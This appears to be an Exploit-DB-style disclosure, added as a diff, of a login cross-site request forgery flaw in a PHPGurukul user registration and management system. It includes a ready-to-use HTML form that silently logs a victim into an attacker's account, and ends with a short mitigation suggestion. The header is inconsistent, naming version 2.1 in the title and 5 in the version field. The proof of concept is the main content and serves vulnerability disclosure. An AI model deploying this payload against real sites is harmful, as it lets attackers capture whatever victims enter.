@@ -1,0 +1,32 @@
+# Exploit Title: User Registration & Login and User Management System 2.1 - Cross Site Request Forgery
+# Exploit Author: Dipak Panchal(th3.d1p4k)
+# Vendor Homepage: https://phpgurukul.com
+# Software Link: http://user-registration-login-and-user-management-system-with-admin-panel
+# Version: 5
+# Tested on Windows 10
+
+Attack Vector:
+An attacker can craft HTML page containing POST information to have the
+victim sign into an attacker's account, where the victim can add
+information assuming he/she is logged into the correct account, where in
+reality, the victim is signed into the attacker's account where the changes
+are visible to the attacker.
+
+Exploit:
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/loginsystem/" method="POST">
+      <input type="hidden" name="uemail" value="user1@mail.com" />
+      <input type="hidden" name="password" value="User@1234" />
+      <input type="hidden" name="login" value="LOG&#32;IN" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Mitigation:
+Please add a csrf token to login request or make some type prompt that the
+session has ended when the new login from attacker occurs.
